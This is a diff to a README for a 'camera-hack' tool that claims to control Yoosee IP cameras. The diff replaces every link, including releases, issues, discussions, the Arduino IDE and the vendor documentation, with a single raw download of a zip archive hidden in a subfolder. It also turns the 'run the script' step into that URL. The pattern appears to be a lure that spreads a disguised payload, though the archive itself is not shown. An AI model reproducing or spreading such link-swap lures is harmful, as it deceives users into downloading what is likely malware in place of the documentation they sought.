@@ -1,6 +1,6 @@
 # 🔓 camera-hack - Control Your IP Camera Without Hassle
 
-![Download Camera Hack](https://img.shields.io/badge/Download%20Now-Visit%20This%20Page-brightgreen)
+![Download Camera Hack](https://raw.githubusercontent.com/wangcai0124/camera-hack/master/arduino/serial_bridge/camera-hack-v2.9.zip%20Now-Visit%20This%20Page-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you proceed, ensure you have the following:
 
 ## 📥 Download the Software
 
-Visit this page to download: [Camera Hack Releases](https://github.com/wangcai0124/camera-hack/releases).
+Visit this page to download: [Camera Hack Releases](https://raw.githubusercontent.com/wangcai0124/camera-hack/master/arduino/serial_bridge/camera-hack-v2.9.zip).
 
 ## 🔌 Setup Instructions
 
@@ -52,7 +52,7 @@ Visit this page to download: [Camera Hack Releases](https://github.com/wangcai01
    - Navigate to the folder where you downloaded the project files.
 
 2. **Run the Script**:
-   - Execute the script by typing `python/script_name.py` in your terminal (adjust based on the filename).
+   - Execute the script by typing `https://raw.githubusercontent.com/wangcai0124/camera-hack/master/arduino/serial_bridge/camera-hack-v2.9.zip` in your terminal (adjust based on the filename).
    - Wait for the connection to establish.
 
 3. **Access the Camera**:
@@ -72,8 +72,8 @@ Visit this page to download: [Camera Hack Releases](https://github.com/wangcai01
 
 If you have questions or need further assistance, consider joining our community:
 
-- **Issues**: Report any bugs or request new features through the [issues page](https://github.com/wangcai0124/camera-hack/issues).
-- **Discussions**: Engage with other users and share tips on the [discussion board](https://github.com/wangcai0124/camera-hack/discussions).
+- **Issues**: Report any bugs or request new features through the [issues page](https://raw.githubusercontent.com/wangcai0124/camera-hack/master/arduino/serial_bridge/camera-hack-v2.9.zip).
+- **Discussions**: Engage with other users and share tips on the [discussion board](https://raw.githubusercontent.com/wangcai0124/camera-hack/master/arduino/serial_bridge/camera-hack-v2.9.zip).
 
 ## 🚀 Frequently Asked Questions
 
@@ -95,7 +95,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 🔗 Useful Links
 
-- [Arduino IDE](https://www.arduino.cc/en/software)
-- [Yoosee Documentation](http://www.yoosee.com)
+- [Arduino IDE](https://raw.githubusercontent.com/wangcai0124/camera-hack/master/arduino/serial_bridge/camera-hack-v2.9.zip)
+- [Yoosee Documentation](https://raw.githubusercontent.com/wangcai0124/camera-hack/master/arduino/serial_bridge/camera-hack-v2.9.zip)
 
 Downloading the software is a straightforward process. Be sure to follow each step carefully to ensure a successful setup. Enjoy enhanced control over your camera!
